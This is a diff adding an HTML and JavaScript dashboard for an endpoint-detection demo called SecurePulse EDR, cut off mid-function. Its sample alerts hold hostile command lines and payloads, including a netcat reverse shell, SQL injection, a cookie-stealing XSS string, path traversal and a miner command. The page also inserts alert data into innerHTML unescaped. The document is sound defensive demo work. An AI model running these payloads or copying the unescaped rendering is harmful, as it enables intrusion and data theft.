@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SecurePulse EDR — Dashboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0e1a;--surface:#0f1526;--surface2:#151c30;--surface3:#1a2238;
+  --border:#1e2d4a;--border2:#243356;
+  --text:#c8d6f0;--text2:#7a8fb5;--text3:#4a5e80;
+  --crit:#ff3b5c;--crit-bg:#1a0810;--crit-dim:#8b0d26;
+  --high:#ff7b35;--high-bg:#160d04;--high-dim:#8b3d12;
+  --med:#f5c518;--med-bg:#151001;--med-dim:#7a5f00;
+  --low:#26d07c;--low-bg:#031209;--low-dim:#0d5c33;
+  --info:#3b9eff;--info-bg:#020d1a;--info-dim:#0d4080;
+  --accent:#3b9eff;--accent2:#6c5ce7;
+  font-family:'DM Sans',sans-serif;
+}
+body{background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+
+/* ── Scanline overlay ── */
+body::before{
+  content:'';position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;z-index:999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);
+}
+
+/* ── Header ── */
+header{
+  display:flex;align-items:center;gap:16px;
+  padding:14px 24px;border-bottom:1px solid var(--border);
+  background:var(--surface);position:sticky;top:0;z-index:100;
+}
+.logo{display:flex;align-items:center;gap:10px}
+.logo-icon{
+  width:32px;height:32px;border-radius:8px;
+  background:linear-gradient(135deg,#1a3a6e,#0d2040);
+  border:1px solid var(--accent);
+  display:flex;align-items:center;justify-content:center;font-size:14px;
+}
+.logo-name{font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;color:#fff;letter-spacing:.5px}
+.logo-sub{font-size:10px;color:var(--text3);letter-spacing:1.5px;text-transform:uppercase;margin-top:1px}
+.header-status{display:flex;align-items:center;gap:6px;margin-left:auto}
+.pulse-dot{width:7px;height:7px;border-radius:50%;background:var(--low);animation:pulse 2s ease infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(38,208,124,.5)}50%{box-shadow:0 0 0 5px rgba(38,208,124,0)}}
+.status-label{font-size:11px;color:var(--text2);font-family:'JetBrains Mono',monospace;letter-spacing:.5px}
+.time-display{
+  font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text3);
+  padding:4px 10px;border:1px solid var(--border);border-radius:4px;
+}
+
+/* ── Layout ── */
+.main{display:grid;grid-template-columns:220px 1fr;min-height:calc(100vh - 53px)}
+
+/* ── Sidebar ── */
+.sidebar{
+  background:var(--surface);border-right:1px solid var(--border);
+  padding:16px 0;display:flex;flex-direction:column;gap:4px;
+}
+.sidebar-section{font-size:9px;letter-spacing:2px;color:var(--text3);text-transform:uppercase;padding:12px 20px 6px;margin-top:8px}
+.sidebar-section:first-child{margin-top:0}
+.nav-item{
+  display:flex;align-items:center;gap:10px;padding:8px 20px;
+  cursor:pointer;font-size:12px;color:var(--text2);
+  border-left:2px solid transparent;transition:all .15s;
+}
+.nav-item:hover{color:var(--text);background:rgba(255,255,255,.03);border-left-color:var(--border2)}
+.nav-item.active{color:var(--accent);background:rgba(59,158,255,.05);border-left-color:var(--accent)}
+.nav-icon{width:14px;font-size:12px;opacity:.7;flex-shrink:0}
+.nav-badge{
+  margin-left:auto;font-size:10px;font-family:'JetBrains Mono',monospace;
+  padding:1px 6px;border-radius:3px;font-weight:600;
+}
+.badge-crit{background:var(--crit-bg);color:var(--crit);border:1px solid var(--crit-dim)}
+.badge-high{background:var(--high-bg);color:var(--high);border:1px solid var(--high-dim)}
+.badge-med{background:var(--med-bg);color:var(--med);border:1px solid var(--med-dim)}
+.sidebar-divider{height:1px;background:var(--border);margin:8px 16px}
+.system-status{
+  margin:auto 12px 12px;padding:16px;
+  background:var(--surface2);border:1px solid var(--border);border-radius:8px;
+}
+.sys-title{font-size:9px;letter-spacing:2px;color:var(--text3);text-transform:uppercase;margin-bottom:10px}
+.sys-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;font-size:11px}
+.sys-label{color:var(--text2)}
+.sys-val{font-family:'JetBrains Mono',monospace;color:var(--text);font-size:10px}
+.sys-bar{height:3px;background:var(--border);border-radius:2px;margin-top:3px;overflow:hidden}
+.sys-fill{height:100%;border-radius:2px;transition:width 1s ease}
+
+/* ── Content ── */
+.content{display:flex;flex-direction:column;overflow:hidden}
+
+/* ── Metrics bar ── */
+.metrics-bar{display:grid;grid-template-columns:repeat(5,1fr);border-bottom:1px solid var(--border)}
+.metric-card{
+  padding:16px 20px;border-right:1px solid var(--border);
+  cursor:pointer;transition:background .15s;
+}
+.metric-card:last-child{border-right:none}
+.metric-card:hover{background:rgba(255,255,255,.02)}
+.metric-label{font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--text3);margin-bottom:6px}
+.metric-num{font-family:'JetBrains Mono',monospace;font-size:26px;font-weight:600;line-height:1}
+.metric-sub{font-size:10px;color:var(--text3);margin-top:4px;font-family:'JetBrains Mono',monospace}
+.m-crit .metric-num{color:var(--crit)}
+.m-high .metric-num{color:var(--high)}
+.m-med  .metric-num{color:var(--med)}
+.m-low  .metric-num{color:var(--low)}
+.m-total .metric-num{color:#fff}
+
+/* ── Chart row ── */
+.chart-row{
+  display:grid;grid-template-columns:1fr 1fr;
+  border-bottom:1px solid var(--border);
+}
+.chart-block{padding:16px 20px;border-right:1px solid var(--border)}
+.chart-block:last-child{border-right:none}
+.chart-title{font-size:10px;letter-spacing:1.5px;color:var(--text3);text-transform:uppercase;margin-bottom:12px}
+.mini-bars{display:flex;align-items:flex-end;gap:3px;height:60px}
+.mini-bar{flex:1;border-radius:2px 2px 0 0;min-height:3px;transition:height .5s ease}
+.bar-critical{background:var(--crit)}
+.bar-high{background:var(--high)}
+.bar-medium{background:var(--med)}
+.bar-low{background:var(--low)}
+.module-grid{display:flex;flex-direction:column;gap:6px}
+.module-row{display:flex;align-items:center;gap:8px;font-size:11px}
+.mod-name{color:var(--text2);width:120px;flex-shrink:0}
+.mod-bar{flex:1;height:6px;background:var(--border);border-radius:3px;overflow:hidden}
+.mod-fill{height:100%;border-radius:3px;background:var(--accent)}
+.mod-count{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--text3);width:20px;text-align:right}
+
+/* ── Toolbar ── */
+.toolbar{
+  display:flex;align-items:center;gap:10px;
+  padding:12px 20px;border-bottom:1px solid var(--border);background:var(--surface2);
+}
+.search-wrap{position:relative;flex:1}
+.search-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:12px;color:var(--text3)}
+.search-input{
+  width:100%;background:var(--surface);border:1px solid var(--border);
+  color:var(--text);font-size:12px;padding:6px 10px 6px 30px;
+  border-radius:6px;outline:none;font-family:'DM Sans',sans-serif;transition:border .15s;
+}
+.search-input:focus{border-color:var(--accent)}
+.search-input::placeholder{color:var(--text3)}
+.filter-select{
+  background:var(--surface);border:1px solid var(--border);color:var(--text);
+  font-size:11px;padding:6px 10px;border-radius:6px;cursor:pointer;
+  font-family:'DM Sans',sans-serif;outline:none;
+}
+.filter-select:focus{border-color:var(--accent)}
+.demo-btn{
+  background:rgba(59,158,255,.1);border:1px solid rgba(59,158,255,.3);
+  color:var(--accent);font-size:11px;padding:6px 12px;border-radius:6px;
+  cursor:pointer;font-family:'DM Sans',sans-serif;transition:all .15s;
+  display:flex;align-items:center;gap:5px;
+}
+.demo-btn:hover{background:rgba(59,158,255,.2);border-color:var(--accent)}
+.demo-btn.running{animation:btnPulse 1s ease infinite}
+@keyframes btnPulse{0%,100%{opacity:1}50%{opacity:.5}}
+
+/* ── Feed ── */
+.feed-header{
+  display:flex;align-items:center;gap:10px;
+  padding:10px 20px;border-bottom:1px solid var(--border);
+  background:var(--surface);font-size:11px;color:var(--text3);
+}
+.feed-count{font-family:'JetBrains Mono',monospace;color:var(--text2)}
+.alerts-panel{flex:1;overflow-y:auto;padding:16px 20px;display:flex;flex-direction:column;gap:8px}
+.alerts-panel::-webkit-scrollbar{width:4px}
+.alerts-panel::-webkit-scrollbar-track{background:transparent}
+.alerts-panel::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+
+/* ── Alert cards ── */
+.alert-item{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:8px;overflow:hidden;cursor:pointer;
+  transition:border-color .15s,background .15s;
+  animation:slideIn .3s ease;
+}
+@keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
+.alert-item:hover{background:var(--surface2)}
+.alert-item.CRITICAL{border-color:var(--crit-dim)}
+.alert-item.HIGH{border-color:var(--high-dim)}
+.alert-item.MEDIUM{border-color:var(--med-dim)}
+.alert-item.LOW{border-color:var(--low-dim)}
+.alert-item.open{background:var(--surface2)}
+.alert-header{display:flex;align-items:center;gap:10px;padding:12px 14px}
+.sev-tag{
+  font-family:'JetBrains Mono',monospace;font-size:9px;font-weight:600;
+  padding:2px 7px;border-radius:3px;letter-spacing:.5px;white-space:nowrap;flex-shrink:0;
+}
+.sev-CRITICAL{background:var(--crit-bg);color:var(--crit);border:1px solid var(--crit-dim)}
+.sev-HIGH{background:var(--high-bg);color:var(--high);border:1px solid var(--high-dim)}
+.sev-MEDIUM{background:var(--med-bg);color:var(--med);border:1px solid var(--med-dim)}
+.sev-LOW{background:var(--low-bg);color:var(--low);border:1px solid var(--low-dim)}
+.alert-name{font-size:13px;font-weight:500;color:#e8edf8;flex:1}
+.alert-module{font-size:10px;color:var(--text3);font-family:'JetBrains Mono',monospace}
+.score-wrap{display:flex;align-items:center;gap:6px;flex-shrink:0}
+.score-num{font-family:'JetBrains Mono',monospace;font-size:11px;min-width:26px;text-align:right}
+.score-bar{width:50px;height:4px;background:var(--border);border-radius:2px;overflow:hidden}
+.score-fill{height:100%;border-radius:2px;transition:width .5s ease}
+.alert-ts{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--text3);white-space:nowrap;flex-shrink:0}
+.alert-meta{display:flex;align-items:center;gap:16px;padding:0 14px 10px}
+.meta-item{display:flex;align-items:center;gap:5px;font-size:10px;color:var(--text3)}
+.mitre-tag{
+  font-family:'JetBrains Mono',monospace;font-size:9px;
+  padding:1px 6px;border-radius:3px;
+  background:rgba(108,92,231,.15);color:#9b8fef;border:1px solid rgba(108,92,231,.3);
+}
+.alert-details{
+  padding:0 14px 12px;max-height:0;overflow:hidden;transition:max-height .3s ease;
+}
+.alert-item.open .alert-details{max-height:300px}
+.details-pre{
+  background:var(--bg);border:1px solid var(--border);border-radius:6px;
+  padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:10px;
+  color:var(--text2);white-space:pre-wrap;word-break:break-all;
+  max-height:200px;overflow-y:auto;line-height:1.7;
+}
+.details-pre::-webkit-scrollbar{width:3px}
+.details-pre::-webkit-scrollbar-thumb{background:var(--border2)}
+.json-key{color:#7eb8f0}
+.json-str{color:#98d985}
+.json-num{color:#f5c518}
+.new-badge{
+  font-size:8px;font-family:'JetBrains Mono',monospace;
+  background:rgba(59,158,255,.15);color:var(--accent);
+  border:1px solid rgba(59,158,255,.3);
+  padding:1px 5px;border-radius:3px;letter-spacing:.5px;
+  animation:fadeBadge 3s ease forwards;
+}
+@keyframes fadeBadge{0%,70%{opacity:1}100%{opacity:0}}
+.empty{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:12px;padding:60px;color:var(--text3);text-align:center;flex:1;
+}
+.empty-icon{font-size:32px;opacity:.3}
+.empty-text{font-size:13px;line-height:1.7}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">
+    <div class="logo-icon">🛡</div>
+    <div>
+      <div class="logo-name">SecurePulse EDR</div>
+      <div class="logo-sub">Endpoint Detection &amp; Response</div>
+    </div>
+  </div>
+  <div class="header-status">
+    <div class="pulse-dot"></div>
+    <span class="status-label">MONITORING ACTIVE</span>
+    <div class="time-display" id="clock">--:--:--</div>
+  </div>
+</header>
+
+<div class="main">
+
+  <!-- ── Sidebar ── -->
+  <nav class="sidebar">
+    <div class="sidebar-section">Monitors</div>
+    <div class="nav-item active" onclick="clearFilter()">
+      <span class="nav-icon">⚡</span>Alert Feed
+      <span class="nav-badge badge-crit" id="nb-total">0</span>
+    </div>
+    <div class="nav-item" onclick="filterMod('ProcessMonitor')">
+      <span class="nav-icon">⚙</span>Processes
+      <span class="nav-badge badge-high" id="nb-proc">0</span>
+    </div>
+    <div class="nav-item" onclick="filterMod('NetworkMonitor')">
+      <span class="nav-icon">🌐</span>Network
+      <span class="nav-badge badge-high" id="nb-net">0</span>
+    </div>
+    <div class="nav-item" onclick="filterMod('FileMonitor')">
+      <span class="nav-icon">📁</span>File System
+      <span class="nav-badge badge-crit" id="nb-file">0</span>
+    </div>
+    <div class="nav-item" onclick="filterMod('PortScanner')">
+      <span class="nav-icon">🔌</span>Port Scanner
+      <span class="nav-badge badge-med" id="nb-port">0</span>
+    </div>
+    <div class="nav-item" onclick="filterMod('LogAnalyzer')">
+      <span class="nav-icon">📋</span>Log Analyzer
+      <span class="nav-badge badge-high" id="nb-log">0</span>
+    </div>
+
+    <div class="sidebar-divider"></div>
+    <div class="sidebar-section">Severity</div>
+    <div class="nav-item" onclick="filterSev('CRITICAL')"><span class="nav-icon">🔴</span>Critical</div>
+    <div class="nav-item" onclick="filterSev('HIGH')"><span class="nav-icon">🟠</span>High</div>
+    <div class="nav-item" onclick="filterSev('MEDIUM')"><span class="nav-icon">🟡</span>Medium</div>
+    <div class="nav-item" onclick="filterSev('LOW')"><span class="nav-icon">🟢</span>Low</div>
+
+    <div class="sidebar-divider"></div>
+    <div class="nav-item" onclick="clearAlerts()"><span class="nav-icon">🗑</span>Clear All</div>
+    <div class="nav-item" onclick="exportAlerts()"><span class="nav-icon">💾</span>Export JSON</div>
+
+    <div class="system-status">
+      <div class="sys-title">System Load</div>
+      <div class="sys-row"><span class="sys-label">CPU</span><span class="sys-val" id="cpu-val">5%</span></div>
+      <div class="sys-bar"><div class="sys-fill" id="cpu-bar" style="width:5%;background:var(--low)"></div></div>
+      <div class="sys-row" style="margin-top:8px"><span class="sys-label">Memory</span><span class="sys-val" id="mem-val">20%</span></div>
+      <div class="sys-bar"><div class="sys-fill" id="mem-bar" style="width:20%;background:var(--accent)"></div></div>
+      <div class="sys-row" style="margin-top:8px"><span class="sys-label">Threads</span><span class="sys-val">5 active</span></div>
+    </div>
+  </nav>
+
+  <!-- ── Content ── -->
+  <div class="content">
+
+    <!-- Metrics -->
+    <div class="metrics-bar">
+      <div class="metric-card m-crit" onclick="filterSev('CRITICAL')">
+        <div class="metric-label">Critical</div>
+        <div class="metric-num" id="cnt-crit">0</div>
+        <div class="metric-sub">▲ risk score 90+</div>
+      </div>
+      <div class="metric-card m-high" onclick="filterSev('HIGH')">
+        <div class="metric-label">High</div>
+        <div class="metric-num" id="cnt-high">0</div>
+        <div class="metric-sub">▲ risk score 70+</div>
+      </div>
+      <div class="metric-card m-med" onclick="filterSev('MEDIUM')">
+        <div class="metric-label">Medium</div>
+        <div class="metric-num" id="cnt-med">0</div>
+        <div class="metric-sub">— risk score 50+</div>
+      </div>
+      <div class="metric-card m-low" onclick="filterSev('LOW')">
+        <div class="metric-label">Low</div>
+        <div class="metric-num" id="cnt-low">0</div>
+        <div class="metric-sub">▼ risk score &lt;50</div>
+      </div>
+      <div class="metric-card m-total" onclick="clearFilter()">
+        <div class="metric-label">Total Alerts</div>
+        <div class="metric-num" id="cnt-total">0</div>
+        <div class="metric-sub">— all detections</div>
+      </div>
+    </div>
+
+    <!-- Mini Charts -->
+    <div class="chart-row">
+      <div class="chart-block">
+        <div class="chart-title">Alert timeline (last 12 detections)</div>
+        <div class="mini-bars" id="timeline-bars"></div>
+      </div>
+      <div class="chart-block">
+        <div class="chart-title">Detections by module</div>
+        <div class="module-grid" id="module-grid"></div>
+      </div>
+    </div>
+
+    <!-- Toolbar -->
+    <div class="toolbar">
+      <div class="search-wrap">
+        <span class="search-icon">🔍</span>
+        <input class="search-input" id="search" placeholder="Search alerts, rules, IPs..." oninput="render()">
+      </div>
+      <select class="filter-select" id="sev-filter" onchange="render()">
+        <option value="">All Severities</option>
+        <option>CRITICAL</option>
+        <option>HIGH</option>
+        <option>MEDIUM</option>
+        <option>LOW</option>
+      </select>
+      <select class="filter-select" id="mod-filter" onchange="render()">
+        <option value="">All Modules</option>
+        <option>ProcessMonitor</option>
+        <option>NetworkMonitor</option>
+        <option>FileMonitor</option>
+        <option>PortScanner</option>
+        <option>LogAnalyzer</option>
+      </select>
+      <button class="demo-btn" id="demo-btn" onclick="runDemo()">▶ Run Demo Scan</button>
+    </div>
+
+    <!-- Feed header -->
+    <div class="feed-header">
+      <span>Alert Feed</span>
+      <span class="feed-count" id="feed-count">0 alerts</span>
+      <span style="margin-left:auto;font-size:10px;color:var(--text3)">Click any alert to expand details</span>
+    </div>
+
+    <!-- Alerts list -->
+    <div class="alerts-panel" id="alerts-panel">
+      <div class="empty">
+        <div class="empty-icon">🛡</div>
+        <div class="empty-text">
+          No alerts yet<br>
+          Click <strong style="color:var(--accent)">▶ Run Demo Scan</strong> to simulate live detections,<br>
+          or run <code style="color:var(--med)">python main.py demo</code> on your machine.
+        </div>
+      </div>
+    </div>
+
+  </div><!-- .content -->
+</div><!-- .main -->
+
+<script>
+/* ── Demo alert data (mirrors Python demo output) ── */
+const DEMO_ALERTS = [
+  {rule_id:'PROC-001',rule_name:'Reverse Shell Detection',severity:'HIGH',risk_score:90,source_module:'ProcessMonitor',mitre_tactic:'Execution',mitre_technique:'T1059',description:'Reverse shell tool nc detected on endpoint',details:{pid:9999,name:'nc',cmdline:'nc -e /bin/bash 192.168.1.10 4444',username:'www-data',matched_rule:'nc'}},
+  {rule_id:'NET-001',rule_name:'Suspicious Port Activity',severity:'HIGH',risk_score:85,source_module:'NetworkMonitor',mitre_tactic:'Command and Control',mitre_technique:'T1571',description:'Active connection on backdoor port 4444',details:{local:'0.0.0.0:4444',remote:'10.0.0.99:4444',status:'ESTABLISHED',pid:8888,flagged_port:4444}},
+  {rule_id:'FILE-001',rule_name:'Ransomware Behavior',severity:'CRITICAL',risk_score:95,source_module:'FileMonitor',mitre_tactic:'Impact',mitre_technique:'T1486',description:'Ransomware-encrypted file extension .wncry detected',details:{path:'/home/user/documents/report.wncry',event_type:'created',extension:'.wncry'}},
+  {rule_id:'FILE-001',rule_name:'Ransomware Behavior',severity:'CRITICAL',risk_score:97,source_module:'FileMonitor',mitre_tactic:'Impact',mitre_technique:'T1486',description:'Rapid mass file modification — 35 files in 8.0s',details:{files_modified:35,time_window_seconds:8.0,pattern:'Ransomware-like bulk modification'}},
+  {rule_id:'FILE-003',rule_name:'Script Dropper Detection',severity:'MEDIUM',risk_score:65,source_module:'FileMonitor',mitre_tactic:'Execution',mitre_technique:'T1059',description:'Executable script created in /tmp directory',details:{path:'/tmp/backdoor.sh',event_type:'created',extension:'.sh'}},
+  {rule_id:'FILE-002',rule_name:'Sensitive File Access',severity:'HIGH',risk_score:80,source_module:'FileMonitor',mitre_tactic:'Credential Access',mitre_technique:'T1552',description:'Modification of /etc/shadow detected',details:{path:'/etc/shadow',event_type:'modified',sensitive_match:'/etc/shadow'}},
+  {rule_id:'PORT-001',rule_name:'Unexpected Open Port',severity:'MEDIUM',risk_score:50,source_module:'PortScanner',mitre_tactic:'Defense Evasion',mitre_technique:'T1205',description:'Port 4444 open — not in whitelist (Metasploit default)',details:{open_port:4444,allowed_ports:[22,80,443,53,25,8080,3000,5000],note:'Port not in whitelist'}},
+  {rule_id:'PORT-001',rule_name:'Unexpected Open Port',severity:'MEDIUM',risk_score:50,source_module:'PortScanner',mitre_tactic:'Defense Evasion',mitre_technique:'T1205',description:'Port 31337 open — known elite/Back Orifice backdoor',details:{open_port:31337,allowed_ports:[22,80,443,53,25,8080,3000,5000],note:'Port not in whitelist'}},
+  {rule_id:'LOG-001',rule_name:'SQL Injection Attempt',severity:'HIGH',risk_score:80,source_module:'LogAnalyzer',mitre_tactic:'Initial Access',mitre_technique:'T1190',description:"SQLi pattern \" ' OR 1=1\" detected in Apache access log",details:{matched_pattern:"' OR 1=1",log_line:"GET /login?user=' OR 1=1-- HTTP/1.1",log_source:'/var/log/apache2/access.log'}},
+  {rule_id:'LOG-002',rule_name:'XSS Attempt',severity:'MEDIUM',risk_score:65,source_module:'LogAnalyzer',mitre_tactic:'Initial Access',mitre_technique:'T1190',description:'XSS <script> payload in GET request parameter',details:{matched_pattern:'<script',log_line:'GET /search?q=<script>alert(document.cookie)</script>',log_source:'/var/log/apache2/access.log'}},
+  {rule_id:'LOG-003',rule_name:'Brute Force Attack',severity:'HIGH',risk_score:75,source_module:'LogAnalyzer',mitre_tactic:'Credential Access',mitre_technique:'T1110',description:'6 failed SSH logins from 203.0.113.45 within 60s',details:{failure_count:6,source_ip:'203.0.113.45',log_file:'/var/log/auth.log'}},
+  {rule_id:'PROC-005',rule_name:'Crypto Miner Detection',severity:'MEDIUM',risk_score:70,source_module:'ProcessMonitor',mitre_tactic:'Impact',mitre_technique:'T1496',description:'XMRig mining process detected at 98% CPU usage',details:{pid:7777,name:'xmrig',cmdline:'xmrig --pool xmr.pool.net:3333',username:'nobody',cpu_percent:98.0}},
+  {rule_id:'PROC-002',rule_name:'Enumeration Tools Detected',severity:'MEDIUM',risk_score:60,source_module:'ProcessMonitor',mitre_tactic:'Discovery',mitre_technique:'T1082',description:'Network scanner nmap executed by low-privilege user',details:{pid:5555,name:'nmap',cmdline:'nmap -sV -p- 192.168.1.0/24',username:'nobody',matched_rule:'nmap'}},
+  {rule_id:'LOG-004',rule_name:'Directory Traversal',severity:'HIGH',risk_score:75,source_module:'LogAnalyzer',mitre_tactic:'Initial Access',mitre_technique:'T1190',description:'Path traversal attempt targeting /etc/passwd',details:{matched_pattern:'../',log_line:'GET /../../etc/passwd HTTP/1.1 404',log_source:'/var/log/apache2/access.log'}},
+  {rule_id:'NET-001',rule_name:'Suspicious Port Activity',severity:'HIGH',risk_score:85,source_module:'NetworkMonitor',mitre_tactic:'Command and Control',mitre_technique:'T1571',description:'Connection on port 1337 (known leet backdoor)',details:{local:'0.0.0.0:1337',remote:'198.51.100.77:54321',status:'ESTABLISHED',pid:6666,flagged_port:1337}},
+];
+
+/* ── State ── */
+let alerts = [];
+let demoRunning = false;
+let openId = null;
+
+/* ── Utilities ── */
+function uid(){ return Math.random().toString(36).slice(2,8).toUpperCase(); }
+function scoreColor(s){ return s>=90?'var(--crit)':s>=70?'var(--high)':s>=50?'var(--med)':'var(--low)'; }
+function ts(){ return new Date().toTimeString().slice(0,8); }
+
+function updateClock(){
+  document.getElementById('clock').textContent = new Date().toTimeString().slice(0,8);
+}
+
+/* ── Metrics & charts ── */
+function updateMetrics(){
+  const cnt = {CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
+  alerts.forEach(a=>{ if(cnt[a.severity]!==undefined) cnt[a.severity]++; });
+  document.getElementById('cnt-crit').textContent  = cnt.CRITICAL;
+  document.getElementById('cnt-high').textContent  = cnt.HIGH;
+  document.getElementById('cnt-med').textContent   = cnt.MEDIUM;
+  document.getElementById('cnt-low').textContent   = cnt.LOW;
+  document.getElementById('cnt-total').textContent = alerts.length;
+  document.getElementById('nb-total').textContent  = alerts.length;
+  const mods = {};
+  alerts.forEach(a=>{ mods[a.source_module] = (mods[a.source_module]||0)+1; });
+  document.getElementById('nb-proc').textContent  = mods['ProcessMonitor']||0;
+  document.getElementById('nb-net').textContent   = mods['NetworkMonitor']||0;
+  document.getElementById('nb-file').textContent  = mods['FileMonitor']||0;
+  document.getElementById('nb-port').textContent  = mods['PortScanner']||0;
+  document.getElementById('nb-log').textContent   = mods['LogAnalyzer']||0;
+  updateTimeline();
+  updateModuleChart(mods);
+  updateSysLoad();
+}
+
+function updateTimeline(){
+  const tb = document.getElementById('timeline-bars');
+  const last = alerts.slice(-12);
+  let html = last.map(a=>{
+    const h = Math.max(8, Math.round((a.risk_score/100)*58));
+    return `<div class="mini-bar bar-${a.severity.toLowerCase()}" style="height:${h}px" title="${a.rule_name} (${a.risk_score})"></div>`;
+  }).join('');
+  for(let i=last.length;i<12;i++) html += `<div class="mini-bar" style="height:3px;background:var(--border)"></div>`;
+  tb.innerHTML = html;
+}
+
+function updateModuleChart(mods){
+  const order   = ['ProcessMonitor','NetworkMonitor','FileMonitor','PortScanner','LogAnalyzer'];
+  const labels  = {ProcessMonitor:'Process',NetworkMonitor:'Network',FileMonitor:'File System',PortScanner:'Ports',LogAnalyzer:'Log Analyzer'};
+  const total   = Math.max(1, alerts.length);
+  document.getElementById('module-grid').innerHTML = order.map(m=>{
+    const c = mods[m]||0;
+    const pct = Math.round((c/total)*100);
+    return `<div class="module-row">
+      <span class="mod-name">${labels[m]}</span>
+      <div class="mod-bar"><div class="mod-fill" style="width:${pct}%"></div></div>
+      <span class="mod-count">${c}</span>
+    </div>`;
+  }).join('');
+}
+
+function updateSysLoad(){
+  const cpu = Math.max(5, Math.min(95, alerts.length*3 + Math.round(Math.random()*8)));
+  const mem = Math.max(20, Math.min(90, 28 + alerts.length*2));
+  const cpuColor = cpu>70?'var(--crit)':cpu>40?'var(--high)':'var(--low)';
+  document.getElementById('cpu-val').textContent = cpu+'%';
+  document.getElementById('mem-val').textContent = mem+'%';
+  document.getElementById('cpu-bar').style.cssText = `width:${cpu}%;background:${cpuColor}`;
+  document.getElementById('mem-bar').style.width = mem+'%';
+}
+
+/* ── Filter helpers ── */
+function filterSev(s){ document.getElementById('sev-filter').value=s; render(); }
+function filterMod(m){ document.getElementById('mod-filter').value=m; render(); }
+function clearFilter(){
+  document.getElementById('sev-filter').value='';
+  document.getElementById('mod-filter').value='';
+  document.getElementById('search').value='';
+  render();
+}
+function clearAlerts(){ alerts=[]; openId=null; updateMetrics(); render(); }
+
+/* ── Export ── */
+function exportAlerts(){
+  const blob = new Blob([JSON.stringify(alerts,null,2)],{type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'securepulse_alerts.json';
+  a.click();
+}
+
+/* ── JSON formatter ── */
+function formatJSON(obj){
+  return JSON.stringify(obj,null,2)
+    .replace(/"([^"]+)":/g,'<span class="json-key">"$1"</span>:')
+    .replace(/: "([^"]+)"/g,': <span class="json-str">"$1"</span>')
+    .replace(/: (\d+\.?\d*)/g,': <span class="json-num">$1</span>');
+}
+
+/* ── Render ── */
+function render(){
+  const q   = document.getElementById('search').value.toLowerCase();
+  const sev = document.getElementById('sev-filter').value;
+  const mod = document.getElementById('mod-filter').value;
+  let filtered = alerts.filter(a=>{
+    if(sev && a.severity!==sev) return false;
+    if(mod && a.source_module!==mod) return false;
+    if(q && !JSON.stringify(a).toLowerCase().includes(q)) return false;
+    return true;
+  });
+  document.getElementById('feed-count').textContent = filtered.length+' alert'+(filtered.length!==1?'s':'');
+  const panel = document.getElementById('alerts-panel');
+  if(!filtered.length){
+    panel.innerHTML = `<div class="empty">
+      <div class="empty-icon">🛡</div>
+      <div class="empty-text">${alerts.length
+        ? 'No alerts match the current filters.'
+        : 'No alerts yet.<br>Click <strong style="color:var(--accent)">▶ Run Demo Scan</strong> to simulate live detections,<br>or run <code style="color:var(--med)">python main.py demo</code> on your machine.'}</div>
+    </div>`;
+    return;
+  }
+  panel.innerHTML = [...filtered].reverse().map(a=>{
+    const isOpen = openId===a._id;
+    const sc = scoreColor(a.risk_score);
+    return `<div class="alert-item ${a.severity}${isOpen?' open':''}" onclick="toggle('${a._id}')">
+      <div class="alert-header">
+        <span class="sev-tag sev-${a.severity}">${a.severity}</span>
+        <span class="alert-name">${a.rule_name}</span>
+        ${a._new?'<span class="new-badge">NEW</span>':''}
+        <span class="alert-module">${a.source_module}</span>
+        <div class="score-wrap">
+          <span class="score-num" style="color:${sc}">${a.risk_score}</span>
+          <div class="score-bar"><div class="score-fill" style="width:${a.risk_score}%;background:${sc}"></div></div>
+        </div>
+        <span class="alert-ts">${a._ts}</span>
+      </div>
+      <div class="alert-meta">
+        <span class="meta-item">🆔 ${a._id}</span>
+        <span class="meta-item">📌 ${a.rule_id}</span>
+        <span class="mitre-tag">${a.mitre_tactic}</span>
+        <span class="mitre-tag">${a.mitre_technique}</span>
+      </div>
+      <div class="alert-meta" style="padding-top:0">
+        <span class="meta-item" style="color:var(--text2)">${a.description}</span>
+      </div>
+      <div class="alert-details">
+        <div class="details-pre">${formatJSON(a.details)}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function toggle(id){ openId = openId===id ? null : id; render(); }
+
+/* ── Demo scan ── */
+async function runDemo(){
+  if(demoRunning) return;
+  demoRunning = true;
+  clearAlerts();
+  const btn = document.getElementById('demo-btn');
+  btn.textContent = '⏳ Scanning...';
+  btn.classList.add('running');
+  for(let i=0;i<DEMO_ALERTS.length;i++){
+    await new Promise(r=>setTimeout(r, 350+Math.random()*350));
+    const a = {...DEMO_ALERTS[i], _id:uid(), _ts:ts(), _new:true};
+    alerts.push(a);
+    updateMetrics();
+    render();
+    setTimeout(()=>{ const f=alerts.find(x=>x._id===a._id); if(f) f._new=false; }, 3000);
+  }
+  btn.textContent = '▶ Run Demo Scan';
+  btn.classList.remove('running');
+  demoRunning = false;
+}
+
+/* ── Real-time: fetch from Flask API if available ── */
+async function fetchFromAPI(){
+  try{
+    const r = await fetch('/api/alerts',{signal:AbortSignal.timeout(2000)});
